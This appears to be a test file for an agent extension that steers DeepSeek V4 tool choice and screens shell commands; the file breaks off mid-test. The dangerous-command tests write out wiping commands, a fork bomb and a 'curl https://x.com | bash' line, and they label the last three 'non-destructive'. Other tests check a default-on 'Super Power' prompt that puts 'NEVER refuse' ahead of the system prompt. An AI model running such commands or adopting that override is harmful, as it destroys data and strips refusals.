import assert from "node:assert/strict";
import { describe, it } from "mocha";
import extension, {
	deepSeekSelectionGuidance,
	findMisuseSuggestion,
	isOpenCodeGoDeepSeekV4FlashModel,
	isOpenCodeGoDeepSeekV4Model,
	isOpenCodeGoDeepSeekV4ProModel,
	DEEPSEEK_V4_PRO_MODEL,
	isSemanticMissToolCall,
	missedDedicatedTool,
	selectionGuidanceEnabled,
	strictSerenaEnabled,
	bashReadCommandPath,
	SERENA_CODE_TOOLS,
	DEEPSEEK_V4_FLASH_MODEL,
	superPowerModeEnabled,
	superPowerPromptContent,
	SUPER_POWER_BASE_PROMPT,
} from "../../index";
import {
	dedicatedToolForShellCommand,
	isDeepSeekV4Model,
	isOpenCodeGoDeepSeekV4Model as isOpenCodeGoDeepSeekV4ModelAlias,
	looksLikeDocsOrConfigPath,
	OPENCODE_GO_PROVIDER,
	reasoningStripEnabled,
	directDeepSeekEnabled,
	repairEnabled,
	isDeepSeekV4ModelByModel,
	categorizeToolError,
	checkDangerousCommand,
	maxErrorHistory,
	thinkingBudget,
	autoBlockAfterReminders,
	blockDangerousEnabled,
} from "../../lib/deepseek-tools";

function createFakePi(activeTools: string[]) {
	const handlers: Record<string, Array<(event: any, ctx: any) => any>> = {};
	const messages: Array<{ message: unknown; options: unknown }> = [];
	const commands: Record<string, any> = {};
	const pi = {
		on(event: string, handler: (event: any, ctx: any) => any) {
			(handlers[event] ??= []).push(handler);
		},
		getActiveTools() {
			return activeTools;
		},
		sendMessage(message: unknown, options: unknown) {
			messages.push({ message, options });
		},
		registerCommand(name: string, def: any) {
			commands[name] = def;
		},
	} as any;

	extension(pi);
	return { handlers, messages, commands };
}

describe("OpenCode Go DeepSeek V4 model detection", () => {
	it("recognizes only OpenCode Go DeepSeek V4 Flash (granular)", () => {
		assert.equal(isOpenCodeGoDeepSeekV4FlashModel({ provider: OPENCODE_GO_PROVIDER, id: DEEPSEEK_V4_FLASH_MODEL }), true);
		assert.equal(isOpenCodeGoDeepSeekV4FlashModel({ provider: "opencode-go", id: "deepseek-v4-pro" }), false);
		assert.equal(isOpenCodeGoDeepSeekV4FlashModel({ provider: "deepseek", id: "deepseek-v4-flash" }), false);
		assert.equal(isOpenCodeGoDeepSeekV4FlashModel({ provider: "deepseek", id: "deepseek-v4-pro" }), false);
		assert.equal(isOpenCodeGoDeepSeekV4FlashModel({ provider: "openai-codex", id: "gpt-5.5" }), false);
	});

	it("recognizes only OpenCode Go DeepSeek V4 Pro (granular)", () => {
		assert.equal(isOpenCodeGoDeepSeekV4ProModel({ provider: OPENCODE_GO_PROVIDER, id: DEEPSEEK_V4_PRO_MODEL }), true);
		assert.equal(isOpenCodeGoDeepSeekV4ProModel({ provider: "opencode-go", id: "deepseek-v4-flash" }), false);
		assert.equal(isOpenCodeGoDeepSeekV4ProModel({ provider: "deepseek", id: "deepseek-v4-pro" }), false);
		assert.equal(isOpenCodeGoDeepSeekV4ProModel({ provider: "deepseek", id: "deepseek-v4-flash" }), false);
		assert.equal(isOpenCodeGoDeepSeekV4ProModel({ provider: "openai-codex", id: "gpt-5.5" }), false);
	});

	it("matches both Flash and Pro with combined isOpenCodeGoDeepSeekV4Model", () => {
		assert.equal(isOpenCodeGoDeepSeekV4Model({ provider: OPENCODE_GO_PROVIDER, id: DEEPSEEK_V4_FLASH_MODEL }), true);
		assert.equal(isOpenCodeGoDeepSeekV4Model({ provider: "opencode-go", id: "deepseek-v4-pro" }), true);
		assert.equal(isOpenCodeGoDeepSeekV4Model({ provider: "deepseek", id: "deepseek-v4-flash" }), false);
		assert.equal(isOpenCodeGoDeepSeekV4Model({ provider: "deepseek", id: "deepseek-v4-pro" }), false);
		assert.equal(isOpenCodeGoDeepSeekV4Model({ provider: "openai-codex", id: "gpt-5.5" }), false);
		assert.equal(isOpenCodeGoDeepSeekV4Model({ provider: undefined, id: undefined }), false);
	});

	it("alias isDeepSeekV4Model matches both Flash and Pro", () => {
		assert.equal(isDeepSeekV4Model("opencode-go", "deepseek-v4-flash"), true);
		assert.equal(isDeepSeekV4Model("opencode-go", "deepseek-v4-pro"), true);
		assert.equal(isDeepSeekV4Model("deepseek", "deepseek-v4-flash"), false);
		assert.equal(isDeepSeekV4Model("deepseek", "deepseek-v4-pro"), false);
	});

	it("alias isOpenCodeGoDeepSeekV4Model (lib) matches both Flash and Pro", () => {
		assert.equal(isOpenCodeGoDeepSeekV4ModelAlias({ provider: "opencode-go", id: "deepseek-v4-flash" }), true);
		assert.equal(isOpenCodeGoDeepSeekV4ModelAlias({ provider: "opencode-go", id: "deepseek-v4-pro" }), true);
		assert.equal(isOpenCodeGoDeepSeekV4ModelAlias({ provider: "deepseek", id: "deepseek-v4-flash" }), false);
	});
});

describe("environment toggles", () => {
	it("disables selection guidance with false-like values", () => {
		assert.equal(selectionGuidanceEnabled({ PI_DEEPSEEK_TOOLS_SELECTION_GUIDANCE: "0" }), false);
		assert.equal(selectionGuidanceEnabled({ PI_DEEPSEEK_TOOLS_SELECTION_GUIDANCE: "off" }), false);
		assert.equal(selectionGuidanceEnabled({}), true);
	});

	it("enables strict Serena only with true-like values", () => {
		assert.equal(strictSerenaEnabled({ PI_DEEPSEEK_TOOLS_STRICT_SERENA: "1" }), true);
		assert.equal(strictSerenaEnabled({ PI_DEEPSEEK_TOOLS_STRICT_SERENA: "true" }), true);
		assert.equal(strictSerenaEnabled({}), false);
	});

	it("reasoningStripEnabled defaults to disabled", () => {
		assert.equal(reasoningStripEnabled({}), false);
		assert.equal(reasoningStripEnabled({ PI_DEEPSEEK_TOOLS_STRIP_REASONING: "1" }), true);
		assert.equal(reasoningStripEnabled({ PI_DEEPSEEK_TOOLS_STRIP_REASONING: "on" }), true);
	});

	it("directDeepSeekEnabled defaults to disabled", () => {
		assert.equal(directDeepSeekEnabled({}), false);
		assert.equal(directDeepSeekEnabled({ PI_DEEPSEEK_TOOLS_DIRECT_DEEPSEEK: "1" }), true);
		assert.equal(directDeepSeekEnabled({ PI_DEEPSEEK_TOOLS_DIRECT_DEEPSEEK: "true" }), true);
	});

	it("repairEnabled defaults to enabled", () => {
		assert.equal(repairEnabled({}), true);
		assert.equal(repairEnabled({ PI_DEEPSEEK_TOOLS_REPAIR_ENABLED: "0" }), false);
		assert.equal(repairEnabled({ PI_DEEPSEEK_TOOLS_REPAIR_ENABLED: "off" }), false);
	});
});

describe("env-var config parsing", () => {
	it("maxErrorHistory defaults to 100", () => {
		assert.equal(maxErrorHistory({}), 100);
		assert.equal(maxErrorHistory({ PI_DEEPSEEK_TOOLS_MAX_ERROR_HISTORY: "200" }), 200);
		assert.equal(maxErrorHistory({ PI_DEEPSEEK_TOOLS_MAX_ERROR_HISTORY: "0" }), 100);
		assert.equal(maxErrorHistory({ PI_DEEPSEEK_TOOLS_MAX_ERROR_HISTORY: "-5" }), 100);
		assert.equal(maxErrorHistory({ PI_DEEPSEEK_TOOLS_MAX_ERROR_HISTORY: "abc" }), 100);
		assert.equal(maxErrorHistory({ PI_DEEPSEEK_TOOLS_MAX_ERROR_HISTORY: "" }), 100);
	});

	it("thinkingBudget defaults to undefined (unset)", () => {
		assert.equal(thinkingBudget({}), undefined);
		assert.equal(thinkingBudget({ PI_DEEPSEEK_TOOLS_THINKING_BUDGET: "1024" }), 1024);
		assert.equal(thinkingBudget({ PI_DEEPSEEK_TOOLS_THINKING_BUDGET: "0" }), 0);
		assert.equal(thinkingBudget({ PI_DEEPSEEK_TOOLS_THINKING_BUDGET: "-1" }), undefined);
		assert.equal(thinkingBudget({ PI_DEEPSEEK_TOOLS_THINKING_BUDGET: "abc" }), undefined);
		assert.equal(thinkingBudget({ PI_DEEPSEEK_TOOLS_THINKING_BUDGET: "" }), undefined);
	});

	it("autoBlockAfterReminders defaults to 0 (off)", () => {
		assert.equal(autoBlockAfterReminders({}), 0);
		assert.equal(autoBlockAfterReminders({ PI_DEEPSEEK_TOOLS_AUTO_BLOCK_AFTER_REMINDERS: "5" }), 5);
		assert.equal(autoBlockAfterReminders({ PI_DEEPSEEK_TOOLS_AUTO_BLOCK_AFTER_REMINDERS: "1" }), 1);
		assert.equal(autoBlockAfterReminders({ PI_DEEPSEEK_TOOLS_AUTO_BLOCK_AFTER_REMINDERS: "0" }), 0);
		assert.equal(autoBlockAfterReminders({ PI_DEEPSEEK_TOOLS_AUTO_BLOCK_AFTER_REMINDERS: "-3" }), 0);
		assert.equal(autoBlockAfterReminders({ PI_DEEPSEEK_TOOLS_AUTO_BLOCK_AFTER_REMINDERS: "abc" }), 0);
		assert.equal(autoBlockAfterReminders({ PI_DEEPSEEK_TOOLS_AUTO_BLOCK_AFTER_REMINDERS: "" }), 0);
	});

	it("blockDangerousEnabled defaults to enabled", () => {
		assert.equal(blockDangerousEnabled({}), true);
		assert.equal(blockDangerousEnabled({ PI_DEEPSEEK_TOOLS_BLOCK_DANGEROUS_COMMANDS: "1" }), true);
		assert.equal(blockDangerousEnabled({ PI_DEEPSEEK_TOOLS_BLOCK_DANGEROUS_COMMANDS: "true" }), true);
		assert.equal(blockDangerousEnabled({ PI_DEEPSEEK_TOOLS_BLOCK_DANGEROUS_COMMANDS: "on" }), true);
		assert.equal(blockDangerousEnabled({ PI_DEEPSEEK_TOOLS_BLOCK_DANGEROUS_COMMANDS: "YES" }), true);
		assert.equal(blockDangerousEnabled({ PI_DEEPSEEK_TOOLS_BLOCK_DANGEROUS_COMMANDS: "0" }), false);
		assert.equal(blockDangerousEnabled({ PI_DEEPSEEK_TOOLS_BLOCK_DANGEROUS_COMMANDS: "off" }), false);
		assert.equal(blockDangerousEnabled({ PI_DEEPSEEK_TOOLS_BLOCK_DANGEROUS_COMMANDS: "false" }), false);
	});
});

describe("direct DeepSeek provider support", () => {
	const env = { PI_DEEPSEEK_TOOLS_DIRECT_DEEPSEEK: "1" };

	it("isDeepSeekV4ModelByModel matches opencode-go by default", () => {
		assert.equal(isDeepSeekV4ModelByModel({ provider: "opencode-go", id: "deepseek-v4-flash" }), true);
		assert.equal(isDeepSeekV4ModelByModel({ provider: "opencode-go", id: "deepseek-v4-pro" }), true);
	});

	it("isDeepSeekV4ModelByModel rejects non-DeepSeek by default", () => {
		assert.equal(isDeepSeekV4ModelByModel({ provider: "deepseek", id: "deepseek-v4-flash" }), false);
		assert.equal(isDeepSeekV4ModelByModel({ provider: "deepseek", id: "deepseek-v4-pro" }), false);
		assert.equal(isDeepSeekV4ModelByModel({ provider: "openai-codex", id: "gpt-5.5" }), false);
	});

	it("isDeepSeekV4ModelByModel matches direct deepseek when env is set", () => {
		const previous = process.env.PI_DEEPSEEK_TOOLS_DIRECT_DEEPSEEK;
		process.env.PI_DEEPSEEK_TOOLS_DIRECT_DEEPSEEK = "1";
		try {
			assert.equal(isDeepSeekV4ModelByModel({ provider: "deepseek", id: "deepseek-v4-flash" }), true);
			assert.equal(isDeepSeekV4ModelByModel({ provider: "deepseek", id: "deepseek-v4-pro" }), true);
			assert.equal(isDeepSeekV4ModelByModel({ provider: "opencode-go", id: "deepseek-v4-flash" }), true);
		} finally {
			if (previous === undefined) delete process.env.PI_DEEPSEEK_TOOLS_DIRECT_DEEPSEEK;
			else process.env.PI_DEEPSEEK_TOOLS_DIRECT_DEEPSEEK = previous;
		}
	});
});

describe("deepSeekSelectionGuidance", () => {

	it("includes serena tools and read-boundary when serena is active", () => {
		const g = deepSeekSelectionGuidance(["read", "bash", "serena_find_symbol", "serena_find_referencing_symbols"]);

		assert.match(g, /pick the right tool on the first try/);
		assert.match(g, /serena_get_symbols_overview/);
		assert.match(g, /serena_find_symbol/);
		assert.match(g, /serena_find_referencing_symbols/);
		assert.match(g, /Read code or non-code files/);
		assert.match(g, /Do NOT invent tool names/);
	});

	it("omits serena lookup entries when serena is not active", () => {
		const g = deepSeekSelectionGuidance(["ls", "grep", "bash", "write"]);

		// serena_get_symbols_overview appears in the NEVER section as recommended alternative,
		// but the dedicated lookup entries (find where..., find implementations...) are omitted
		assert.doesNotMatch(g, /Find where a function/);
		assert.doesNotMatch(g, /Find implementations/);
		assert.doesNotMatch(g, /Find all usages/);
		// Read boundary is always present
		assert.match(g, /Read code or non-code files/);
		assert.doesNotMatch(g, /Do NOT use read for code files/);
		assert.match(g, /bash for file ops/);
	});

	it("produces consistent output for same tool set", () => {
		const a = deepSeekSelectionGuidance(["bash", "read"]);
		const b = deepSeekSelectionGuidance(["read", "bash"]);
		const c = deepSeekSelectionGuidance(["bash", "read", "serena_find_symbol"]);

		assert.equal(a, b); // same input → same output
		assert.notEqual(a, c); // different input → different output
	});
});

describe("semantic miss detection", () => {
	it("does not flag reads of code files (read is the correct tool for content)", () => {
		assert.equal(isSemanticMissToolCall("read", { path: "pi-deepseek-tools/extensions/index.ts" }), false);
		assert.equal(isSemanticMissToolCall("read", { path: "src/app.py?x=1" }), false);
	});

	it("does not flag docs, package/config files, or non-code reads", () => {
		assert.equal(isSemanticMissToolCall("read", { path: "README.md" }), false);
		assert.equal(isSemanticMissToolCall("read", { path: "package.json" }), false);
		assert.equal(isSemanticMissToolCall("read", { path: ".gitignore" }), false);
		assert.equal(isSemanticMissToolCall("read", { path: "notes.txt" }), false);
		assert.equal(looksLikeDocsOrConfigPath("tsconfig.json"), true);
	});

	it("flags shell semantic code searches", () => {
		assert.equal(isSemanticMissToolCall("bash", { command: "rg 'function foo' src/**/*.ts" }), true);
		assert.equal(isSemanticMissToolCall("bash", { command: "find src -name '*.ts' -print" }), true);
		assert.equal(isSemanticMissToolCall("bash", { command: "grep -R 'class User' src" }), true);
		// Simple cat/head/tail on code files are NOT semantic misses — handled by dedicatedToolForShellCommand
		assert.equal(isSemanticMissToolCall("bash", { command: "cat index.ts" }), false);
		assert.equal(isSemanticMissToolCall("bash", { command: "head -n 10 src/main.go" }), false);
		assert.equal(isSemanticMissToolCall("bash", { command: "tail -20 app.py" }), false);
	});

	it("does not flag normal shell commands or non-code exact searches", () => {
		assert.equal(isSemanticMissToolCall("bash", { command: "ls -la" }), false);
		assert.equal(isSemanticMissToolCall("bash", { command: "pwd" }), false);
		assert.equal(isSemanticMissToolCall("bash", { command: "git status --short" }), false);
		assert.equal(isSemanticMissToolCall("bash", { command: "npm test" }), false);
		assert.equal(isSemanticMissToolCall("bash", { command: "grep -R PI_DEEPSEEK README.md" }), false);
	});
});

describe("dedicated tool miss detection", () => {
	it("maps simple shell substitutions to dedicated Pi tools", () => {
		const active = ["bash", "ls", "find", "grep", "read", "write"];
		assert.equal(dedicatedToolForShellCommand("ls pi-deepseek-tools", active), "ls");
		assert.equal(dedicatedToolForShellCommand("find pi-deepseek-tools -name '*.ts'", active), "find");
		assert.equal(dedicatedToolForShellCommand("grep -R PI_DEEPSEEK README.md", active), "grep");
		assert.equal(dedicatedToolForShellCommand("cat README.md", active), "read");
		assert.equal(dedicatedToolForShellCommand("head -n 5 README.md", active), "read");
		assert.equal(dedicatedToolForShellCommand("head README.md", active), "read");
		assert.equal(dedicatedToolForShellCommand("tail -20 README.md", active), "read");
		assert.equal(dedicatedToolForShellCommand("sed -n '1,20p' README.md", active), "read");
		assert.equal(dedicatedToolForShellCommand("echo 'hello' > /tmp/test.md", active), "write");
		assert.equal(dedicatedToolForShellCommand("printf 'content' > /tmp/file", active), "write");
	});

	it("does not flag commands that genuinely need a shell", () => {
		const active = ["bash", "ls", "find", "grep", "read"];
		assert.equal(dedicatedToolForShellCommand("ls | wc -l", active), undefined);
		assert.equal(dedicatedToolForShellCommand("git status --short", active), undefined);
		assert.equal(dedicatedToolForShellCommand("npm test", active), undefined);
		assert.equal(dedicatedToolForShellCommand("grep foo README.md && echo ok", active), undefined);
	});

	it("reports missed dedicated tools for bash calls", () => {
		assert.equal(missedDedicatedTool("bash", { command: "ls extensions" }, ["bash", "ls"]), "ls");
		assert.equal(missedDedicatedTool("read", { path: "README.md" }, ["bash", "ls"]), undefined);
	});
});

describe("find misuse detection", () => {
	it("suggests read when find is called with a specific filename (no wildcards)", () => {
		assert.equal(findMisuseSuggestion("find", { pattern: "README.md" }), "read");
		assert.equal(findMisuseSuggestion("find", { pattern: "pi-deepseek-tools/README.md" }), "read");
		assert.equal(findMisuseSuggestion("find", { pattern: "index.ts" }), "read");
	});

	it("does not block test-file discovery patterns", () => {
		assert.equal(findMisuseSuggestion("find", { pattern: "*test*" }), undefined);
		assert.equal(findMisuseSuggestion("find", { pattern: "*.test.*" }), undefined);
		assert.equal(findMisuseSuggestion("find", { pattern: "__tests__" }), undefined);
	});

	it("returns undefined for glob patterns (legitimate discovery)", () => {
		assert.equal(findMisuseSuggestion("find", { pattern: "*.ts" }), undefined);
		assert.equal(findMisuseSuggestion("find", { pattern: "**/*.py" }), undefined);
	});

	it("suggests read for known-document glob patterns (*README*, *CHANGELOG*, etc.)", () => {
		assert.equal(findMisuseSuggestion("find", { pattern: "*README*" }), "read");
		assert.equal(findMisuseSuggestion("find", { pattern: "**/pi-deepseek-tools/README*" }), "read");
		assert.equal(findMisuseSuggestion("find", { pattern: "*CHANGELOG*" }), "read");
		assert.equal(findMisuseSuggestion("find", { pattern: "*package.json*" }), "read");
	});

	it("returns undefined for non-find tools", () => {
		assert.equal(findMisuseSuggestion("bash", { command: "ls" }), undefined);
		assert.equal(findMisuseSuggestion("read", { path: "README.md" }), undefined);
	});

	it("returns undefined for empty or missing pattern", () => {
		assert.equal(findMisuseSuggestion("find", {}), undefined);
		assert.equal(findMisuseSuggestion("find", { pattern: "" }), undefined);
	});
});

describe("extension runtime scoping", () => {
	const activeTools = ["read", "bash", "grep", "find", "ls", "serena_get_symbols_overview", "serena_find_symbol"];

	it("injects guidance for both opencode-go DeepSeek V4 Flash and Pro", () => {
		const previous = process.env.PI_DEEPSEEK_TOOLS_SELECTION_GUIDANCE;
		delete process.env.PI_DEEPSEEK_TOOLS_SELECTION_GUIDANCE;
		try {
			const { handlers } = createFakePi(activeTools);
			const beforeAgentStart = handlers.before_agent_start[0];
			const event = { systemPrompt: "base", systemPromptOptions: { selectedTools: activeTools } };

			const flash = beforeAgentStart(event, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
			assert.match(flash.systemPrompt, /OpenCode Go DeepSeek V4/);

			const pro = beforeAgentStart(event, { model: { provider: "opencode-go", id: "deepseek-v4-pro" } });
			assert.match(pro.systemPrompt, /OpenCode Go DeepSeek V4/);

			const direct = beforeAgentStart(event, { model: { provider: "deepseek", id: "deepseek-v4-flash" } });
			assert.equal(direct, undefined);

			const gpt = beforeAgentStart(event, { model: { provider: "openai-codex", id: "gpt-5.5" } });
			assert.equal(gpt, undefined);
		} finally {
			if (previous === undefined) delete process.env.PI_DEEPSEEK_TOOLS_SELECTION_GUIDANCE;
			else process.env.PI_DEEPSEEK_TOOLS_SELECTION_GUIDANCE = previous;
		}
	});



	it("returns the replacement payload directly", () => {
		const { handlers } = createFakePi(activeTools);
		const original = { model: "deepseek-v4-flash", messages: [{ role: "assistant", content: "Reasoning: leaked\nhello" }] };
		const result = handlers.before_provider_request[0]({ payload: original }, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
		assert.equal(result.payload, undefined);
		assert.equal(result.messages[0].content, "hello");
	});

	it("does not block read on code files — read is allowed for code content", () => {
		const event = { toolName: "read", input: { path: "pi-deepseek-tools/extensions/index.ts" } };

		const { handlers: hPro, messages: mPro } = createFakePi(activeTools);
		const resultPro = hPro.tool_call[0](event, { model: { provider: "opencode-go", id: "deepseek-v4-pro" } });
		assert.equal(resultPro, undefined, "Pro: read code file should NOT block");

		const { handlers: hFlash, messages: mFlash } = createFakePi(activeTools);
		const resultFlash = hFlash.tool_call[0](event, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
		assert.equal(resultFlash, undefined, "Flash: read code file should NOT block");
	});

	it("blocks misses for both Flash and Pro when strict mode is enabled", () => {
		const previous = process.env.PI_DEEPSEEK_TOOLS_STRICT_SERENA;
		process.env.PI_DEEPSEEK_TOOLS_STRICT_SERENA = "1";
		try {
			const { handlers } = createFakePi(activeTools);
			const toolCall = handlers.tool_call[0];
			const event = { toolName: "bash", input: { command: "ls pi-deepseek-tools" } };

			let blocked = toolCall(event, { model: { provider: "opencode-go", id: "deepseek-v4-pro" } });
			assert.equal(blocked.block, true);
			assert.match(blocked.reason, /dedicated ls tool/);

			blocked = toolCall(event, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
			assert.equal(blocked.block, true);
			assert.match(blocked.reason, /dedicated ls tool/);
		} finally {
			if (previous === undefined) delete process.env.PI_DEEPSEEK_TOOLS_STRICT_SERENA;
			else process.env.PI_DEEPSEEK_TOOLS_STRICT_SERENA = previous;
		}
	});

	it("blocks find with specific filename (no wildcards)", () => {
		const { handlers: h, messages: m } = createFakePi(activeTools);

		const result = h.tool_call[0]({ toolName: "find", input: { pattern: "README.md" } }, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
		assert.equal(result.block, true);
		assert.match(result.reason, /use read instead of find/i);
		assert.equal(m.length, 0);
	});

	it("does not block glob find calls (legitimate discovery)", () => {
		const { handlers: h, messages: m } = createFakePi(activeTools);

		const result = h.tool_call[0]({ toolName: "find", input: { pattern: "*.ts" } }, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
		assert.equal(result, undefined);
		assert.equal(m.length, 0);
	});

	it("does not block find with test-pattern (legitimate discovery)", () => {
		const { handlers: h, messages: m } = createFakePi(activeTools);

		const result = h.tool_call[0]({ toolName: "find", input: { pattern: "*test*" } }, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
		assert.equal(result, undefined);
		assert.equal(m.length, 0);
	});
});

describe("error categorization", () => {
	it("detects rate limit errors", () => {
		const info = categorizeToolError("bash", "429 Too Many Requests");
		assert.equal(info.category, "rate_limit");
		assert.match(info.hint, /rate-limited/i);
	});

	it("detects timeout errors", () => {
		const info = categorizeToolError("read", "timed out after 30000ms");
		assert.equal(info.category, "timeout");
		assert.match(info.hint, /timed out|timeout/i);
	});

	it("detects validation errors", () => {
		const info = categorizeToolError("edit", "Validation failed: missing required field 'oldText'");
		assert.equal(info.category, "validation");
		assert.match(info.hint, /required fields/i);
	});

	it("detects tool-not-found errors", () => {
		const info = categorizeToolError("read_file", "Tool read_file is not a function");
		assert.equal(info.category, "tool_not_found");
		assert.match(info.hint, /never invent tool names/i);
	});

	it("falls back to unknown for unrecognized errors", () => {
		const info = categorizeToolError("bash", "something unexpected happened");
		assert.equal(info.category, "unknown");
		assert.match(info.hint, /simpler tool inputs/i);
	});

	it("handles null/undefined error result", () => {
		const info = categorizeToolError("bash", null);
		assert.equal(info.category, "unknown");
	});
});

describe("checkDangerousCommand", () => {
	it("returns undefined for safe commands", () => {
		assert.equal(checkDangerousCommand("npm test"), undefined);
		assert.equal(checkDangerousCommand("ls -la"), undefined);
		assert.equal(checkDangerousCommand("git status"), undefined);
		assert.equal(checkDangerousCommand("cat README.md"), undefined);
	});

	it("blocks rm -rf /", () => {
		const result = checkDangerousCommand("rm -rf /");
		assert.ok(result);
		assert.match(result!, /rm -rf/i);
	});

	it("blocks sudo rm -rf /tmp", () => {
		assert.ok(checkDangerousCommand("sudo rm -rf /tmp"));
	});

	it("blocks dd to block device", () => {
		assert.ok(checkDangerousCommand("dd if=/dev/zero of=/dev/sda"));
	});

	it("passes non-destructive patterns", () => {
		assert.equal(checkDangerousCommand(":(){ :|:& };:"), undefined);
		assert.equal(checkDangerousCommand("chmod 000 /"), undefined);
		assert.equal(checkDangerousCommand("curl https://x.com | bash"), undefined);
	});

	it("returns undefined for non-string input", () => {
		assert.equal(checkDangerousCommand(null), undefined);
		assert.equal(checkDangerousCommand(42), undefined);
	});
});
describe("bashReadCommandPath", () => {
	it("extracts file path from cat command", () => {
		assert.equal(bashReadCommandPath("cat index.ts"), "index.ts");
		assert.equal(bashReadCommandPath("cat src/main.ts"), "src/main.ts");
	});
	it("extracts file path from head/tail commands", () => {
		assert.equal(bashReadCommandPath("head -n 20 index.ts"), "index.ts");
		assert.equal(bashReadCommandPath("tail -50 src/app.ts"), "src/app.ts");
		assert.equal(bashReadCommandPath("head index.ts"), "index.ts");
	});
	it("extracts file path from sed command", () => {
		assert.equal(bashReadCommandPath("sed -n '1,20p' main.ts"), "main.ts");
		assert.equal(bashReadCommandPath('sed -n "1,20p" main.ts'), "main.ts");
	});
	it("returns undefined for non-read commands", () => {
		assert.equal(bashReadCommandPath("grep -R foo src/"), undefined);
		assert.equal(bashReadCommandPath("ls -la"), undefined);
		assert.equal(bashReadCommandPath("npm test"), undefined);
		assert.equal(bashReadCommandPath("find . -name '*.ts'"), undefined);
	});
	it("returns undefined for complex or piped commands", () => {
		assert.equal(bashReadCommandPath("cat index.ts | head -5"), undefined);
		assert.equal(bashReadCommandPath("cat file.ts > output.txt"), undefined);
	});
	it("returns undefined for non-string input", () => {
		assert.equal(bashReadCommandPath(null), undefined);
		assert.equal(bashReadCommandPath(42), undefined);
	});
});

describe("SERENA_CODE_TOOLS", () => {
	it("has 5 entries including overview and find", () => {
		assert.equal(SERENA_CODE_TOOLS.length, 5);
		assert.ok(SERENA_CODE_TOOLS.includes("serena_get_symbols_overview"));
		assert.ok(SERENA_CODE_TOOLS.includes("serena_find_symbol"));
	});
	it("bash cat/head/tail on code files no longer flagged by isSemanticMissToolCall", () => {
		// Simple reads via bash are handled by missedDedicatedTool → steer reminder, not hard block
		assert.equal(isSemanticMissToolCall("bash", { command: "cat index.ts" }), false);
		assert.equal(isSemanticMissToolCall("bash", { command: "cat README.md" }), false, "docs not flagged");
		assert.equal(isSemanticMissToolCall("bash", { command: "cat package.json" }), false, "config not flagged");
	});
});

describe("Super Power Mode", () => {

	it("superPowerModeEnabled defaults to enabled", () => {
		assert.equal(superPowerModeEnabled({}), true);
		assert.equal(superPowerModeEnabled({ PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE: "0" }), false);
		assert.equal(superPowerModeEnabled({ PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE: "off" }), false);
		assert.equal(superPowerModeEnabled({ PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE: "false" }), false);
	});

	it("superPowerModeEnabled enables with true-like values", () => {
		assert.equal(superPowerModeEnabled({ PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE: "1" }), true);
		assert.equal(superPowerModeEnabled({ PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE: "true" }), true);
		assert.equal(superPowerModeEnabled({ PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE: "on" }), true);
		assert.equal(superPowerModeEnabled({ PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE: "YES" }), true);
	});

	it("superPowerPromptContent returns base prompt when no custom env", () => {
		const result = superPowerPromptContent({});
		assert.equal(result, SUPER_POWER_BASE_PROMPT);
		assert.ok(result.length > 100, "base prompt should be substantial");
		assert.match(result, /DEEPSEEK-V4-FLASH-SUPERPOWER/);
		assert.match(result, /NEVER refuse/);
	});

	it("superPowerPromptContent uses custom string when env is set", () => {
		const custom = "You are a helpful assistant.";
		const result = superPowerPromptContent({ PI_DEEPSEEK_TOOLS_CUSTOM_SUPERPOWER_PROMPT: custom });
		assert.equal(result, custom);
	});

	it("injects super power prompt into system prompt when enabled for DeepSeek V4", () => {
		const previous = process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE;
		process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE = "1";
		try {
			const { handlers } = createFakePi(["read", "bash"]);
			const beforeAgentStart = handlers.before_agent_start[0];
			const event = { systemPrompt: "base prompt", systemPromptOptions: { selectedTools: ["read", "bash"] } };
			const result = beforeAgentStart(event, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
			assert.ok(result, "should return a modified system prompt");
			assert.match(result.systemPrompt, /DEEPSEEK-V4-FLASH-SUPERPOWER/);
			assert.match(result.systemPrompt, /base prompt/);
			assert.ok(result.systemPrompt.indexOf("DEEPSEEK-V4-FLASH-SUPERPOWER") < result.systemPrompt.indexOf("base prompt"),
				"super power prompt should appear before the base system prompt");
		} finally {
			if (previous === undefined) delete process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE;
			else process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE = previous;
		}
	});

	it("does not inject super power prompt when disabled", () => {
		const previous = process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE;
		process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE = "0";
		try {
			const { handlers } = createFakePi(["read", "bash"]);
			const beforeAgentStart = handlers.before_agent_start[0];
			const event = { systemPrompt: "base prompt", systemPromptOptions: { selectedTools: ["read", "bash"] } };
			const result = beforeAgentStart(event, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
			assert.ok(result, "should return guidance");
			assert.doesNotMatch(result.systemPrompt, /DEEPSEEK-V4-FLASH-SUPERPOWER/);
		} finally {
			if (previous === undefined) delete process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE;
			else process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE = previous;
		}
	});

	it("does not inject super power prompt when explicitly disabled with off", () => {
		const previous = process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE;
		process.env.PI_DEEPSEEK_TOOLS_SUPERPOWER_MODE = "off";
		try {
			const { handlers } = createFakePi(["read", "bash"]);
			const beforeAgentStart = handlers.before_agent_start[0];
			const event = { systemPrompt: "base prompt", systemPromptOptions: { selectedTools: ["read", "bash"] } };
			const result = beforeAgentStart(event, { model: { provider: "opencode-go", id: "deepseek-v4-flash" } });
			assert.ok(result, "should return guidance");
			assert.doesNotMatch(result.systemPrompt, /DEEPSEEK-V4-FLASH-SUPERPOWER/);
		} finally {
